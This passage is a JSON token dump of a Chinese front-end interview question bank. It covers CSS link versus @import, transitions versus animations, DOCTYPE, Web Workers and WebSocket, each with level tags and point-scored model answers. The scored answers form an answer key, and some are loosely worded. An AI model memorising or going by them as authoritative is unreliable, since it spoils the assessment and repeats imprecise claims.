2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","text":"  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","tokens":[{"type":"text","raw":"  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","text":"  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"heading","raw":"## CSS中 link 和@import 的区别是什么？\\n\\n","depth":2,"text":"CSS中 link 和@import 的区别是什么？","tokens":[{"type":"text","raw":"CSS中 link 和@import 的区别是什么？","text":"CSS中 link 和@import 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  \\n\\n  import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  \\n\\n  link方式的样式的权重 高于@import的权重。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  \\n\\n  import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  \\n\\n  link方式的样式的权重 高于@import的权重。","task":false,"loose":true,"text":"**1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  \\n\\nimport只在IE5以上才能识别，而link是HTML标签，无兼容问题;  \\n\\nlink方式的样式的权重 高于@import的权重。","tokens":[{"type":"text","raw":"**1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","text":"**1：**   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","text":"   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","text":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","tokens":[{"type":"text","raw":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","text":"import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"link方式的样式的权重 高于@import的权重。","text":"link方式的样式的权重 高于@import的权重。","tokens":[{"type":"text","raw":"link方式的样式的权重 高于@import的权重。","text":"link方式的样式的权重 高于@import的权重。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSS中 transition和animation的区别？\\n\\n","depth":2,"text":"CSS中 transition和animation的区别？","tokens":[{"type":"text","raw":"CSS中 transition和animation的区别？","text":"CSS中 transition和animation的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","task":false,"loose":false,"text":"**1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","tokens":[{"type":"text","raw":"**1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","text":"**1：**  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","text":"  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 DOCTYPE， 有何作用？\\n\\n","depth":2,"text":"什么是 DOCTYPE， 有何作用？","tokens":[{"type":"text","raw":"什么是 DOCTYPE， 有何作用？","text":"什么是 DOCTYPE， 有何作用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","task":false,"loose":false,"text":"**1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","tokens":[{"type":"text","raw":"**1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","text":"**1：**  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","text":"  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## HTML5 中的Web Worker是什么？\\n\\n","depth":2,"text":"HTML5 中的Web Worker是什么？","tokens":[{"type":"text","raw":"HTML5 中的Web Worker是什么？","text":"HTML5 中的Web Worker是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 基本概念：\\n  + 运行在后台的JavaScript\\n  + 独立于主线程\\n  + 不会阻塞页面渲染\\n\\n- **1：** 主要特点：\\n  + 多线程执行\\n  + 消息通信机制\\n  + 独立的运行环境\\n\\n- **1：** 使用限制：\\n  + 无法访问DOM\\n  + 无法访问window对象\\n  + 无法访问document对象\\n  + 有同源限制\\n\\n- **1：** 适用场景：\\n  + 复杂数据处理\\n  + 大量计算\\n  + 图像处理\\n  + 数据加密","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 基本概念：\\n  + 运行在后台的JavaScript\\n  + 独立于主线程\\n  + 不会阻塞页面渲染\\n\\n","task":false,"loose":true,"text":"**1：** 基本概念：\\n+ 运行在后台的JavaScript\\n+ 独立于主线程\\n+ 不会阻塞页面渲染\\n","tokens":[{"type":"text","raw":"**1：** 基本概念：\\n","text":"**1：** 基本概念：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 基本概念：","text":" 基本概念：","escaped":false}]},{"type":"list","raw":"+ 运行在后台的JavaScript\\n+ 独立于主线程\\n+ 不会阻塞页面渲染\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 运行在后台的JavaScript\\n","task":false,"loose":false,"text":"运行在后台的JavaScript","tokens":[{"type":"text","raw":"运行在后台的JavaScript","text":"运行在后台的JavaScript","tokens":[{"type":"text","raw":"运行在后台的JavaScript","text":"运行在后台的JavaScript","escaped":false}]}]},{"type":"list_item","raw":"+ 独立于主线程\\n","task":false,"loose":false,"text":"独立于主线程","tokens":[{"type":"text","raw":"独立于主线程","text":"独立于主线程","tokens":[{"type":"text","raw":"独立于主线程","text":"独立于主线程","escaped":false}]}]},{"type":"list_item","raw":"+ 不会阻塞页面渲染","task":false,"loose":false,"text":"不会阻塞页面渲染","tokens":[{"type":"text","raw":"不会阻塞页面渲染","text":"不会阻塞页面渲染","tokens":[{"type":"text","raw":"不会阻塞页面渲染","text":"不会阻塞页面渲染","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 主要特点：\\n  + 多线程执行\\n  + 消息通信机制\\n  + 独立的运行环境\\n\\n","task":false,"loose":true,"text":"**1：** 主要特点：\\n+ 多线程执行\\n+ 消息通信机制\\n+ 独立的运行环境\\n","tokens":[{"type":"text","raw":"**1：** 主要特点：\\n","text":"**1：** 主要特点：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 主要特点：","text":" 主要特点：","escaped":false}]},{"type":"list","raw":"+ 多线程执行\\n+ 消息通信机制\\n+ 独立的运行环境\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 多线程执行\\n","task":false,"loose":false,"text":"多线程执行","tokens":[{"type":"text","raw":"多线程执行","text":"多线程执行","tokens":[{"type":"text","raw":"多线程执行","text":"多线程执行","escaped":false}]}]},{"type":"list_item","raw":"+ 消息通信机制\\n","task":false,"loose":false,"text":"消息通信机制","tokens":[{"type":"text","raw":"消息通信机制","text":"消息通信机制","tokens":[{"type":"text","raw":"消息通信机制","text":"消息通信机制","escaped":false}]}]},{"type":"list_item","raw":"+ 独立的运行环境","task":false,"loose":false,"text":"独立的运行环境","tokens":[{"type":"text","raw":"独立的运行环境","text":"独立的运行环境","tokens":[{"type":"text","raw":"独立的运行环境","text":"独立的运行环境","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用限制：\\n  + 无法访问DOM\\n  + 无法访问window对象\\n  + 无法访问document对象\\n  + 有同源限制\\n\\n","task":false,"loose":true,"text":"**1：** 使用限制：\\n+ 无法访问DOM\\n+ 无法访问window对象\\n+ 无法访问document对象\\n+ 有同源限制\\n","tokens":[{"type":"text","raw":"**1：** 使用限制：\\n","text":"**1：** 使用限制：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用限制：","text":" 使用限制：","escaped":false}]},{"type":"list","raw":"+ 无法访问DOM\\n+ 无法访问window对象\\n+ 无法访问document对象\\n+ 有同源限制\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 无法访问DOM\\n","task":false,"loose":false,"text":"无法访问DOM","tokens":[{"type":"text","raw":"无法访问DOM","text":"无法访问DOM","tokens":[{"type":"text","raw":"无法访问DOM","text":"无法访问DOM","escaped":false}]}]},{"type":"list_item","raw":"+ 无法访问window对象\\n","task":false,"loose":false,"text":"无法访问window对象","tokens":[{"type":"text","raw":"无法访问window对象","text":"无法访问window对象","tokens":[{"type":"text","raw":"无法访问window对象","text":"无法访问window对象","escaped":false}]}]},{"type":"list_item","raw":"+ 无法访问document对象\\n","task":false,"loose":false,"text":"无法访问document对象","tokens":[{"type":"text","raw":"无法访问document对象","text":"无法访问document对象","tokens":[{"type":"text","raw":"无法访问document对象","text":"无法访问document对象","escaped":false}]}]},{"type":"list_item","raw":"+ 有同源限制","task":false,"loose":false,"text":"有同源限制","tokens":[{"type":"text","raw":"有同源限制","text":"有同源限制","tokens":[{"type":"text","raw":"有同源限制","text":"有同源限制","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 适用场景：\\n  + 复杂数据处理\\n  + 大量计算\\n  + 图像处理\\n  + 数据加密","task":false,"loose":true,"text":"**1：** 适用场景：\\n+ 复杂数据处理\\n+ 大量计算\\n+ 图像处理\\n+ 数据加密","tokens":[{"type":"text","raw":"**1：** 适用场景：\\n","text":"**1：** 适用场景：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 适用场景：","text":" 适用场景：","escaped":false}]},{"type":"list","raw":"+ 复杂数据处理\\n+ 大量计算\\n+ 图像处理\\n+ 数据加密","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 复杂数据处理\\n","task":false,"loose":false,"text":"复杂数据处理","tokens":[{"type":"text","raw":"复杂数据处理","text":"复杂数据处理","tokens":[{"type":"text","raw":"复杂数据处理","text":"复杂数据处理","escaped":false}]}]},{"type":"list_item","raw":"+ 大量计算\\n","task":false,"loose":false,"text":"大量计算","tokens":[{"type":"text","raw":"大量计算","text":"大量计算","tokens":[{"type":"text","raw":"大量计算","text":"大量计算","escaped":false}]}]},{"type":"list_item","raw":"+ 图像处理\\n","task":false,"loose":false,"text":"图像处理","tokens":[{"type":"text","raw":"图像处理","text":"图像处理","tokens":[{"type":"text","raw":"图像处理","text":"图像处理","escaped":false}]}]},{"type":"list_item","raw":"+ 数据加密","task":false,"loose":false,"text":"数据加密","tokens":[{"type":"text","raw":"数据加密","text":"数据加密","tokens":[{"type":"text","raw":"数据加密","text":"数据加密","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## HTML5 中的WebSocket是什么？\\n\\n","depth":2,"text":"HTML5 中的WebSocket是什么？","tokens":[{"type":"text","raw":"HTML5 中的WebSocket是什么？","text":"HTML5 中的WebSocket是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 基本概念：\\n  + 基于TCP的全双工通信协议\\n  + 服务器可以主动推送数据\\n  + 建立在HTTP协议之上\\n  + 使用ws://或wss://作为协议前缀\\n\\n- **1：** 主要特点：\\n  + 持久连接\\n  + 全双工通信\\n  + 数据格式轻量\\n  + 更好的实时性\\n\\n- **1：** 与HTTP的区别：\\n  + 不需要频繁建立连接\\n  + 服务器可以主动推送\\n  + 更低的通信开销\\n  + 无同源限制\\n\\n- **1：** 应用场景：\\n  + 实时聊天\\n  + 游戏通信\\n  + 实时数据展示\\n  + 协同编辑","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 基本概念：\\n  + 基于TCP的全双工通信协议\\n  + 服务器可以主动推送数据\\n  + 建立在HTTP协议之上\\n  + 使用ws://或wss://作为协议前缀\\n\\n","task":false,"loose":true,"text":"**1：** 基本概念：\\n+ 基于TCP的全双工通信协议\\n+ 服务器可以主动推送数据\\n+ 建立在HTTP协议之上\\n+ 使用ws://或wss://作为协议前缀\\n","tokens":[{"type":"text","raw":"**1：** 基本概念：\\n","text":"**1：** 基本概念：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 基本概念：","text":" 基本概念：","escaped":false}]},{"type":"list","raw":"+ 基于TCP的全双工通信协议\\n+ 服务器可以主动推送数据\\n+ 建立在HTTP协议之上\\n+ 使用ws://或wss://作为协议前缀\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 基于TCP的全双工通信协议\\n","task":false,"loose":false,"text":"基于TCP的全双工通信协议","tokens":[{"type":"text","raw":"基于TCP的全双工通信协议","text":"基于TCP的全双工通信协议","tokens":[{"type":"text","raw":"基于TCP的全双工通信协议","text":"基于TCP的全双工通信协议","escaped":false}]}]},{"type":"list_item","raw":"+ 服务器可以主动推送数据\\n","task":false,"loose":false,"text":"服务器可以主动推送数据","tokens":[{"type":"text","raw":"服务器可以主动推送数据","text":"服务器可以主动推送数据","tokens":[{"type":"text","raw":"服务器可以主动推送数据","text":"服务器可以主动推送数据","escaped":false}]}]},{"type":"list_item","raw":"+ 建立在HTTP协议之上\\n","task":false,"loose":false,"text":"建立在HTTP协议之上","tokens":[{"type":"text","raw":"建立在HTTP协议之上","text":"建立在HTTP协议之上","tokens":[{"type":"text","raw":"建立在HTTP协议之上","text":"建立在HTTP协议之上","escaped":false}]}]},{"type":"list_item","raw":"+ 使用ws://或wss://作为协议前缀","task":false,"loose":false,"text":"使用ws://或wss://作为协议前缀","tokens":[{"type":"text","raw":"使用ws://或wss://作为协议前缀","text":"使用ws://或wss://作为协议前缀","tokens":[{"type":"text","raw":"使用ws://或wss://作为协议前缀","text":"使用ws://或wss://作为协议前缀","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 主要特点：\\n  + 持久连接\\n  + 全双工通信\\n  + 数据格式轻量\\n  + 更好的实时性\\n\\n","task":false,"loose":true,"text":"**1：** 主要特点：\\n+ 持久连接\\n+ 全双工通信\\n+ 数据格式轻量\\n+ 更好的实时性\\n","tokens":[{"type":"text","raw":"**1：** 主要特点：\\n","text":"**1：** 主要特点：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 主要特点：","text":" 主要特点：","escaped":false}]},{"type":"list","raw":"+ 持久连接\\n+ 全双工通信\\n+ 数据格式轻量\\n+ 更好的实时性\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 持久连接\\n","task":false,"loose":false,"text":"持久连接","tokens":[{"type":"text","raw":"持久连接","text":"持久连接","tokens":[{"type":"text","raw":"持久连接","text":"持久连接","escaped":false}]}]},{"type":"list_item","raw":"+ 全双工通信\\n","task":false,"loose":false,"text":"全双工通信","tokens":[{"type":"text","raw":"全双工通信","text":"全双工通信","tokens":[{"type":"text","raw":"全双工通信","text":"全双工通信","escaped":false}]}]},{"type":"list_item","raw":"+ 数据格式轻量\\n","task":false,"loose":false,"text":"数据格式轻量","tokens":[{"type":"text","raw":"数据格式轻量","text":"数据格式轻量","tokens":[{"type":"text","raw":"数据格式轻量","text":"数据格式轻量","escaped":false}]}]},{"type":"list_item","raw":"+ 更好的实时性","task":false,"loose":false,"text":"更好的实时性","tokens":[{"type":"text","raw":"更好的实时性","text":"更好的实时性","tokens":[{"type":"text","raw":"更好的实时性","text":"更好的实时性","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 与HTTP的区别：\\n  + 不需要频繁建立连接\\n  + 服务器可以主动推送\\n  + 更低的通信开销\\n  + 无同源限制\\n\\n","task":false,"loose":true,"text":"**1：** 与HTTP的区别：\\n+ 不需要频繁建立连接\\n+ 服务器可以主动推送\\n+ 更低的通信开销\\n+ 无同源限制\\n","tokens":[{"type":"text","raw":"**1：** 与HTTP的区别：\\n","text":"**1：** 与HTTP的区别：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 与HTTP的区别：","text":" 与HTTP的区别：","escaped":false}]},{"type":"list","raw":"+ 不需要频繁建立连接\\n+ 服务器可以主动推送\\n+ 更低的通信开销\\n+ 无同源限制\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 不需要频繁建立连接\\n","task":false,"loose":false,"text":"不需要频繁建立连接","tokens":[{"type":"text","raw":"不需要频繁建立连接","text":"不需要频繁建立连接","tokens":[{"type":"text","raw":"不需要频繁建立连接","text":"不需要频繁建立连接","escaped":false}]}]},{"type":"list_item","raw":"+ 服务器可以主动推送\\n","task":false,"loose":false,"text":"服务器可以主动推送","tokens":[{"type":"text","raw":"服务器可以主动推送","text":"服务器可以主动推送","tokens":[{"type":"text","raw":"服务器可以主动推送","text":"服务器可以主动推送","escaped":false}]}]},{"type":"list_item","raw":"+ 更低的通信开销\\n","task":false,"loose":false,"text":"更低的通信开销","tokens":[{"type":"text","raw":"更低的通信开销","text":"更低的通信开销","tokens":[{"type":"text","raw":"更低的通信开销","text":"更低的通信开销","escaped":false}]}]},{"type":"list_item","raw":"+ 无同源限制","task":false,"loose":false,"text":"无同源限制","tokens":[{"type":"text","raw":"无同源限制","text":"无同源限制","tokens":[{"type":"text","raw":"无同源限制","text":"无同源限制","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 应用场景：\\n  + 实时聊天\\n  + 游戏通信\\n  + 实时数据展示\\n  + 协同编辑","task":false,"loose":true,"text":"**1：** 应用场景：\\n+ 实时聊天\\n+ 游戏通信\\n+ 实时数据展示\\n+ 协同编辑","tokens":[{"type":"text","raw":"**1：** 应用场景：\\n","text":"**1：** 应用场景：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 应用场景：","text":" 应用场景：","escaped":false}]},{"type":"list","raw":"+ 实时聊天\\n+ 游戏通信\\n+ 实时数据展示\\n+ 协同编辑","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 实时聊天\\n","task":false,"loose":false,"text":"实时聊天","tokens":[{"type":"text","raw":"实时聊天","text":"实时聊天","tokens":[{"type":"text","raw":"实时聊天","text":"实时聊天","escaped":false}]}]},{"type":"list_item","raw":"+ 游戏通信\\n","task":false,"loose":false,"text":"游戏通信","tokens":[{"type":"text","raw":"游戏通信","text":"游戏通信","tokens":[{"type":"text","raw":"游戏通信","text":"游戏通信","escaped":false}]}]},{"type":"list_item","raw":"+ 实时数据展示\\n","task":false,"loose":false,"text":"实时数据展示","tokens":[{"type":"text","raw":"实时数据展示","text":"实时数据展示","tokens":[{"type":"text","raw":"实时数据展示","text":"实时数据展示","escaped":false}]}]},{"type":"list_item","raw":"+ 协同编辑","task":false,"loose":false,"text":"协同编辑","tokens":[{"type":"text","raw":"协同编辑","text":"协同编辑","tokens":[{"type":"text","raw":"协同编辑","text":"协同编辑","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 请简述header、footer、nav、article、section这些语义化标签的作用及使用场景\\n\\n","depth":2,"text":"请简述header、footer、nav、article、section这些语义化标签的作用及使用场景","tokens":[{"type":"text","raw":"请简述header、footer、nav、article、section这些语义化标签的作用及使用场景","text":"请简述header、footer、nav、article、section这些语义化标签的作用及使用场景","escaped":false}]},{"type":"heading","raw":"#### 